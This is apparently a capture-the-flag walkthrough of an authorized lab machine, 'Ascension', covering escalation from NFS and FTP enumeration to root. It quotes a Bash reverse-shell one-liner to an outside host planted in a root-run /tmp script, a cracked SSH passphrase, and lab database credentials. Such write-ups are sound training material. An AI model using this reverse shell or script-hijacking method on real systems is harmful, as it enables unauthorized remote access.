# Ascension

**Category:** Linux Privilege Escalation  
**Techniques:** NFS enumeration and UID/GID spoofing (nfsshell), SSH key passphrase cracking, MySQL credential harvesting, port forwarding (chisel), process monitoring (pspy), capability abuse (cap_setuid)

## TL;DR

Anonymous FTP exposed a password wordlist, while HTTP enumeration on a WordPress install and NFS mounting both stalled out early, the NFS share held an SSH key pair for `user1`, but the key was passphrase-protected. A detour into `nfsshell` (which needed patching to build against a modern GCC) confirmed write access to the NFS share and looked like a shortcut via SSH key injection, but that turned out to be a dead end: the writable directory wasn't actually `~/.ssh`. Going back to basics, cracking the key's passphrase with John (about 20 minutes against rockyou) got a shell as `user1`. From there, database credentials found in `/var` unlocked a MySQL instance (reached via `chisel` port forwarding), which contained a credential for `user3`. A second MySQL-adjacent port (33060) turned out to be a dead end. Backtracking to `user1`, running `pspy` caught a root-owned `backup.sh` script executing from `/tmp`; planting a reverse shell payload at that path caught a callback as `user2`, another partial lead that didn't directly continue upward. The real path ran back through `user3`, whose home directory held an oddly-placed `python3` binary carrying the `cap_setuid` capability, exploitable directly via GTFOBins for a root shell.

## Full Walkthrough

### Enumeration

Nmap:

![ascension screenshot 1](images/ascension/ascension-01.png)

Three ports stand out: NFS (possible share mounting), HTTP, and FTP (worth checking for anonymous access). Running a version/script scan:

![ascension screenshot 2](images/ascension/ascension-02.png)

![ascension screenshot 3](images/ascension/ascension-03.png)

FTP allows anonymous login; NFS doesn't show up in this scan.

**FTP enumeration**, manually:

![ascension screenshot 4](images/ascension/ascension-04.png)

![ascension screenshot 5](images/ascension/ascension-05.png)

Looks like a password wordlist.

**HTTP enumeration:**

![ascension screenshot 6](images/ascension/ascension-06.png)

Port 80 hosts Apache2. Running `dirsearch` for common extensions:

![ascension screenshot 7](images/ascension/ascension-07.png)

It's a WordPress site, but the homepage itself isn't found yet. Adding `.html` to the search:

![ascension screenshot 8](images/ascension/ascension-08.png)

An `index.php` shows up, returning a 500 error. Opening it in the browser:

![ascension screenshot 9](images/ascension/ascension-09.png)

Blank page. Trying WPScan:

![ascension screenshot 10](images/ascension/ascension-10.png)

Blocked. Fuzzing with WordPress-specific wordlists from SecLists instead:

![ascension screenshot 11](images/ascension/ascension-11.png)

A large set of `wp-admin`/`wp-includes` paths turns up. Checking `/index.html` shows the actual exposed page:

![ascension screenshot 12](images/ascension/ascension-12.png)

(WPScan's `--force` flag would have been worth trying too.) Switching to Feroxbuster:

![ascension screenshot 13](images/ascension/ascension-13.png)

It runs successfully:

![ascension screenshot 14](images/ascension/ascension-14.png)

But turns up nothing useful.

**NFS enumeration**, manually:

![ascension screenshot 15](images/ascension/ascension-15.png)

A share, `/srv/info/user1`, stands out. Mounting it:

![ascension screenshot 16](images/ascension/ascension-16.png)

![ascension screenshot 17](images/ascension/ascension-17.png)

An `id_rsa` / `id_rsa.pub` pair:

![ascension screenshot 18](images/ascension/ascension-18.png)

The public key reveals the associated username: `user1`. Trying SSH with it: copying the key elsewhere and fixing permissions:

![ascension screenshot 19](images/ascension/ascension-19.png)

![ascension screenshot 20](images/ascension/ascension-20.png)

Attempting to connect:

![ascension screenshot 21](images/ascension/ascension-21.png)

A passphrase is required. Extracting it for offline cracking with `ssh2john`:

![ascension screenshot 22](images/ascension/ascension-22.png)

Trying the wordlist recovered from FTP first:

![ascension screenshot 23](images/ascension/ascension-23.png)

No luck. Falling back to rockyou:

![ascension screenshot 24](images/ascension/ascension-24.png)

This will take a while, so it's left running in the background.

### Initial Access as user1

While that runs, HackTricks mentions [NFSShell](https://github.com/Supermathie/nfsshell), a tool for interacting with an NFS share directly, including spoofing UID/GID, without mounting it on the system. Worth trying in parallel.

Installing dependencies:

![ascension screenshot 25](images/ascension/ascension-25.png)

Cloning the repository:

![ascension screenshot 26](images/ascension/ascension-26.png)

Building it:

![ascension screenshot 27](images/ascension/ascension-27.png)

The build fails. The error traces back to old C code incompatible with a modern GCC. Fixing it: backing up the source, then patching the code:

![ascension screenshot 28](images/ascension/ascension-28.png)

A further fix is needed at line 2191, changing the `dircmp(char **p, char **q)` signature:

![ascension screenshot 29](images/ascension/ascension-29.png)

![ascension screenshot 30](images/ascension/ascension-30.png)

Building again:

![ascension screenshot 31](images/ascension/ascension-31.png)

This time it succeeds. Running it:

![ascension screenshot 32](images/ascension/ascension-32.png)

The menu shows a `host <host>` command is needed first. A useful reference on practical NFSShell usage: [Using NFSShell to compromise older environments](https://www.pentestpartners.com/security-blog/using-nfsshell-to-compromise-older-environments/), which covers checking directory permissions and setting UID/GID accordingly, and recommends running the tool as root.

Listing shares with `export`:

![ascension screenshot 33](images/ascension/ascension-33.png)

Mounting a share:

![ascension screenshot 34](images/ascension/ascension-34.png)

Checking the required UID/GID with `ls -l`:

![ascension screenshot 35](images/ascension/ascension-35.png)

UID 1001 and GID 1001 are needed. Setting them accordingly:

![ascension screenshot 36](images/ascension/ascension-36.png)

Testing write access with a simple `test.txt`:

![ascension screenshot 37](images/ascension/ascension-37.png)

Write access confirmed. The obvious next idea: upload an SSH key pair to get a passwordless login. Generating a new pair:

![ascension screenshot 38](images/ascension/ascension-38.png)

![ascension screenshot 39](images/ascension/ascension-39.png)

Setting permissions to 600:

![ascension screenshot 40](images/ascension/ascension-40.png)

Transferring the public key to the share and adding the private key's counterpart to the local `~/.ssh/authorized_keys`:

![ascension screenshot 41](images/ascension/ascension-41.png)

![ascension screenshot 42](images/ascension/ascension-42.png)

Trying to SSH in:

![ascension screenshot 43](images/ascension/ascension-43.png)

Still rejected. Running SSH verbosely confirms the server simply doesn't accept the uploaded public key, and the reason becomes clear: the writable NFS path isn't actually `~/.ssh` on the target, it's `/srv/nfs/user1`. This entire detour turns out to be a dead end.

The only remaining path is cracking the original `id_rsa` passphrase properly. Downloading the key, extracting it with `ssh2john`, and cracking with John:

![ascension screenshot 44](images/ascension/ascension-44.png)

Waiting for it to finish:

![ascension screenshot 45](images/ascension/ascension-45.png)

After about 20 minutes, a password comes back:

```
Sammie1
```

SSHing in as `user1`:

![ascension screenshot 46](images/ascension/ascension-46.png)

Access confirmed.

![ascension screenshot 47](images/ascension/ascension-47.png)

Access denied on most things at first glance. Looking for the first flag:

![ascension screenshot 48](images/ascension/ascension-48.png)

Found in `/opt/user1`:

![ascension screenshot 49](images/ascension/ascension-49.png)

Lateral movement to another user looks like the next step. Checking `sudo -l`, SUID binaries, and capabilities:

![ascension screenshot 50](images/ascension/ascension-50.png)

`sudo -l` isn't accessible.

![ascension screenshot 51](images/ascension/ascension-51.png)

Checking the SUID list against GTFOBins doesn't turn up anything exploitable for now. Checking `/srv`:

![ascension screenshot 52](images/ascension/ascension-52.png)

And `/var`:

![ascension screenshot 53](images/ascension/ascension-53.png)

Database credentials show up here, worth checking if a database is actually running. Running LinPEAS:

![ascension screenshot 54](images/ascension/ascension-54.png)

It doesn't run correctly. Trying LinEnum instead:

![ascension screenshot 55](images/ascension/ascension-55.png)

Checking system info to troubleshoot LinPEAS:

![ascension screenshot 56](images/ascension/ascension-56.png)

Downloading the correct amd64 build:

![ascension screenshot 57](images/ascension/ascension-57.png)

Still misbehaving. Falling back to `unix-privesc-check`:

![ascension screenshot 58](images/ascension/ascension-58.png)

Running it in standard mode:

![ascension screenshot 59](images/ascension/ascension-59.png)

**Manual enumeration:** crontab:

![ascension screenshot 60](images/ascension/ascension-60.png)

Nothing there. The earlier `pwlist.txt` from FTP is still unaccounted for. Checking writable directories:

![ascension screenshot 61](images/ascension/ascension-61.png)

Internal ports:

![ascension screenshot 62](images/ascension/ascension-62.png)

MySQL, port 3306, is running locally. Forwarding it with `chisel` is the obvious next move.

### Access as user3

Setting up `chisel`:

![ascension screenshot 63](images/ascension/ascension-63.png)

![ascension screenshot 64](images/ascension/ascension-64.png)

With the tunnel up, connecting to the database with the credentials found earlier:

```
User: wpuser
Password: wppassword
```

![ascension screenshot 65](images/ascension/ascension-65.png)

![ascension screenshot 66](images/ascension/ascension-66.png)

![ascension screenshot 67](images/ascension/ascension-67.png)

Some interesting tables. Inspecting them with `describe`:

![ascension screenshot 68](images/ascension/ascension-68.png)

![ascension screenshot 69](images/ascension/ascension-69.png)

Checking a few before finding the right one:

![ascension screenshot 70](images/ascension/ascension-70.png)

The fourth table turns out to hold what's needed. Querying users:

![ascension screenshot 71](images/ascension/ascension-71.png)

A credential for `user3` comes back. Logging in:

![ascension screenshot 72](images/ascension/ascension-72.png)

A `python3` executable sits in `user3`'s home directory, an odd thing to find there, worth remembering.

![ascension screenshot 73](images/ascension/ascension-73.png)

`sudo -l`:

![ascension screenshot 74](images/ascension/ascension-74.png)

No sudo access. Crontab:

![ascension screenshot 75](images/ascension/ascension-75.png)

SUID binaries:

![ascension screenshot 76](images/ascension/ascension-76.png)

Nothing there. Writable directories:

![ascension screenshot 77](images/ascension/ascension-77.png)

![ascension screenshot 78](images/ascension/ascension-78.png)

Flag 5 found in `/opt`. Rechecking internal ports in case something was missed:

![ascension screenshot 79](images/ascension/ascension-79.png)

Port 33060 wasn't noticed before, potentially another database instance. Forwarding it the same way as before:

![ascension screenshot 80](images/ascension/ascension-80.png)

Connecting:

![ascension screenshot 81](images/ascension/ascension-81.png)

Testing whether it's linked to the earlier `pwlist.txt`:

![ascension screenshot 82](images/ascension/ascension-82.png)

Brute-forcing against it runs into errors. Digging into the error output:

![ascension screenshot 83](images/ascension/ascension-83.png)

Even a direct SSH-style connection attempt returns a protocol mismatch. Browsing to port 3360 (sic) directly:

![ascension screenshot 84](images/ascension/ascension-84.png)

This port isn't the way forward.

### Access as user2

Stepping back to enumerate more broadly, starting from `user1` again. Checking running processes with [pspy](https://github.com/DominicBreuker/pspy):

![ascension screenshot 85](images/ascension/ascension-85.png)

A `backup.sh` script is running out of `/tmp`. Checking it:

![ascension screenshot 86](images/ascension/ascension-86.png)

The file itself is empty right now, but if a script named `backup.sh` is placed at that path, it will get executed, and by whichever user runs the job, likely a route to a reverse shell. Using a simple Bash one-liner:

```
bash -c "bash -i >& /dev/tcp/10.200.70.82/1234 0>&1"
```

Writing it into `backup.sh`, starting a listener, and waiting:

![ascension screenshot 87](images/ascension/ascension-87.png)

![ascension screenshot 88](images/ascension/ascension-88.png)

![ascension screenshot 89](images/ascension/ascension-89.png)

A shell comes back as `user2`. Checking the flag in `/opt`.

The next step is figuring out the path to `ftpuser` or root. Enumeration as `user2` doesn't turn up much: `sudo -l` requires a password, no interesting SUID binaries, the only cronjob is `backup.sh` itself, and `getcap` shows nothing. Since the intended lateral movement path runs from `user1` to `user3`, and `user3` is already compromised, the more promising thread is back there.

![ascension screenshot 90](images/ascension/ascension-90.png)

As noted earlier, `user3`'s home directory holds a `python3` binary, still an odd thing to see sitting there.

![ascension screenshot 91](images/ascension/ascension-91.png)

Running `getcap -r` broadly returns no output, but checking this specific binary directly:

```
/usr/sbin/getcap python3
```

![ascension screenshot 92](images/ascension/ascension-92.png)

It carries `cap_setuid=ep`, enough on its own for a root shell. Checking GTFOBins for the exploitation method:

![ascension screenshot 93](images/ascension/ascension-93.png)

Running the corresponding command:

![ascension screenshot 94](images/ascension/ascension-94.png)

Root shell obtained.

---

*Educational write-up from an authorized lab environment (HackSmarter). Not a guide for unauthorized access.*
